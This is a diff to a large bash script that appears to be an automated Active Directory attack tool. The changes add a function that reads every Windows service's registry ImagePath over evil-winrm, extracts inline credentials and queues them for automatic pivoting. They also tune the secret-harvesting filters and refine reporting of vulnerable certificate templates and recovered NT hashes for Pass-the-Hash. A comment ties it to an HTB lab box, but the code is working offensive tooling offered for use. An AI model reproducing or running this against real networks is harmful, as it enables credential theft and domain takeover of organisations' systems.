@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.37.3"
+readonly VERSION="1.38.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2592,8 +2592,37 @@ _winrm_exec() {
 # exactly what the admin-only `nxc --dpapi` can't: our OWN creds (cmdkey/credman),
 # flags, and the local privesc surface (AlwaysInstallElevated, non-system32 SYSTEM
 # services, SYSTEM scheduled tasks, top-level dirs). Findings feed the engine.
+# Service binaries very often embed credentials directly in their ImagePath command
+# line (e.g. `C:\Windows\helpdesk.exe -u clifford.davey -p <pw>`) — a classic lateral
+# move on a DC with no obvious AD path (this is exactly the Sendai foothold). Read the
+# registry ImagePath of EVERY service (svchost-excluded: those are arg-less DLL hosts),
+# surface the ones carrying credential-like args, and feed them to harvest_secrets so
+# the embedded account is extracted, queued and pivoted AUTOMATICALLY. Run as its OWN
+# short command so the big/slow recon below (which can hit the WinRM timeout) can never
+# swallow this high-value result.
+_winrm_service_creds() {
+    have evil-winrm || return
+    subsection "Service ImagePaths with inline credentials (registry, svchost-excluded)"
+    local ps='Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" -Name ImagePath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ImagePath | Where-Object { $_ -notmatch "svchost" }'
+    local raw; raw=$(_winrm_exec "$ps" 2>/dev/null \
+        | sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' \
+        | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|^Info: |Exiting with code')
+    [[ -z "$raw" ]] && { info "No service ImagePaths read (shell/Kerberos issue)"; return; }
+    # Keep only ImagePaths that carry credential-like arguments — those are the loot.
+    local creds; creds=$(grep -iE '(-u[: ]|/u:|-user|/user:|-p[: ]|/p:|-pass|-password|/password|credential|/cred)' <<<"$raw")
+    if [[ -n "$creds" ]]; then
+        loot "${C_RED}${C_BOLD}★★ Service binary with INLINE credentials → harvesting & pivoting:${C_RESET}"
+        printf '%s\n' "$creds" | head -20 | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
+        # process-sub (not a pipe) so queued creds survive in the parent shell.
+        harvest_secrets "winrm-service-imagepath" < <(printf '%s\n' "$creds")
+    else
+        info "No inline-credential service ImagePaths found"
+    fi
+}
+
 _winrm_postex() {
     have evil-winrm || return
+    _winrm_service_creds      # fast, high-value: inline service creds → auto-pivot
     subsection "WinRM post-exploitation recon (as ${USER})"
     local ps
     ps='whoami /all; echo "===CMDKEY==="; cmdkey /list; '
@@ -3969,7 +3998,12 @@ harvest_secrets() {
     for s in "${hits[@]}"; do
         # filter obvious non-secrets
         [[ "$s" =~ ^(password|passwd|reset|account|domain|admin|user|users|remote|management)$ ]] && continue
-        [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol|log|htb|local)$ ]] && continue
+        [[ "$s" == */* || "$s" == *\\* ]] && continue   # paths are not passwords
+        # FILENAMES masquerade as strong tokens (Bginfo64.exe, PsExec64.exe have
+        # upper+lower+digit) — drop anything ending in a known file extension.
+        [[ "$s" =~ \.(xml|bin|rels|png|jpg|jpeg|gif|bmp|svg|csv|ini|inf|pol|log|log1|log2|htb|local|exe|dll|sys|msi|msu|bat|cmd|ps1|psm1|vbs|com|cat|mui|tmp|dat|db|bak|lnk|url|cfg|config|conf|manifest|regtrans|regtrans-ms|blf|etl|evtx|node|json|txt|md|library-ms|mapimail|desklink|zfsendtotarget)$ ]] && continue
+        # NTFS / journal artifacts: TMContainer0000000000000000001, $-prefixed, long zero runs
+        [[ "$s" =~ ^[$] || "$s" =~ [Cc]ontainer[0-9]{6,} || "$s" =~ 0{8,} ]] && continue
         _plausible_secret "$s" || continue          # drop GUIDs, hex, blobs, fragments
         if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
             loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
@@ -5599,9 +5633,9 @@ gen_report() {
             echo "## Recovered secrets"; echo
             echo '```'; sort -u "$o/credential_map.txt"; echo '```'; echo
         fi
-        if grep -qiE 'ESC[0-9]+' "$o/certipy_find.txt" 2>/dev/null; then
+        if grep -qiE 'ESC[0-9]+' "$o"/certipy_find*.txt 2>/dev/null; then
             echo "## ⚠ Vulnerable ADCS templates"; echo
-            echo '```'; grep -iE 'Template Name|ESC[0-9]+' "$o/certipy_find.txt" | head -40; echo '```'; echo
+            echo '```'; grep -hiE 'Template Name|ESC[0-9]+' "$o"/certipy_find*.txt | head -40; echo '```'; echo
         fi
         local acl; acl=$(ls "$o"/acl_writable_*.txt 2>/dev/null | head -1)
         if [[ -n "$acl" ]]; then
@@ -5663,7 +5697,17 @@ final_summary() {
     kerb_n=$(_cnt_re 'krb5tgs' "$OUTDIR/kerberoast_hashes.txt")
     ntlm_n=$(_cnt_re ':::' "$OUTDIR/secretsdump.txt")
     cracked_n=$(_cnt_lines "$OUTDIR/cracked_passwords.txt")
-    adcs_state=$(grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && echo "${C_RED}VULNERABLE${C_RESET}" || echo "${C_GREY}not flagged${C_RESET}")
+    # ESC found → VULNERABLE; a CA exists but no ESC for our creds → "CA present"
+    # (don't say "not flagged" when an Enterprise CA was clearly discovered — the ESC
+    # may only be visible to a group we haven't pivoted to yet, e.g. CA-OPERATORS);
+    # nothing at all → "not flagged".
+    if grep -qiE 'ESC[0-9]+' "$OUTDIR"/certipy_find*.txt 2>/dev/null; then
+        adcs_state="${C_RED}VULNERABLE${C_RESET}"
+    elif grep -qiE 'Enrollment Service|Certificate Auth|pKIEnrollment|Found PKI|Certificate Templates|Enrollment WebService' "$OUTDIR"/certipy_find*.txt "$OUTDIR"/ad_attack_surface_ldap.txt "$OUTDIR"/adautopwn.log 2>/dev/null; then
+        adcs_state="${C_YELLOW}CA present (no ESC for current creds)${C_RESET}"
+    else
+        adcs_state="${C_GREY}not flagged${C_RESET}"
+    fi
     admin_state=$([[ "$ntlm_n" -gt 0 || ${#OWNED_ADMIN[@]} -gt 0 ]] && echo "${C_GREEN}${C_BOLD}DOMAIN IMPACT${C_RESET}" || echo "${C_YELLOW}no domain dump yet${C_RESET}")
 
     ui_panel_top
@@ -5756,13 +5800,13 @@ final_summary() {
         fi
 
         if [[ -s "$OUTDIR/recovered_hashes.txt" ]]; then
-            detail "  ${C_BOLD}${C_MAGENTA}» NT hashes recovered${C_RESET} ${C_DIM}($(grep -c . "$OUTDIR/recovered_hashes.txt") — Pass-the-Hash · hashcat -m 1000)${C_RESET}"
+            detail "  ${C_BOLD}${C_MAGENTA}» NT hashes recovered${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/recovered_hashes.txt" | grep -c .) — Pass-the-Hash · hashcat -m 1000)${C_RESET}"
             local _hl _hu _hh
             while IFS= read -r _hl; do
                 [[ -z "$_hl" ]] && continue
                 _hu=$(awk '{print $1}' <<<"$_hl"); _hh=$(awk '{print $2}' <<<"$_hl")
                 detail "      ${C_MAGENTA}${C_BOLD}${_hu}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${_hh}${C_RESET}"
-            done < "$OUTDIR/recovered_hashes.txt"
+            done < <(sort -u "$OUTDIR/recovered_hashes.txt")
         fi
 
         if [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -qi krb5asrep "$OUTDIR/asrep_hashes.txt"; then
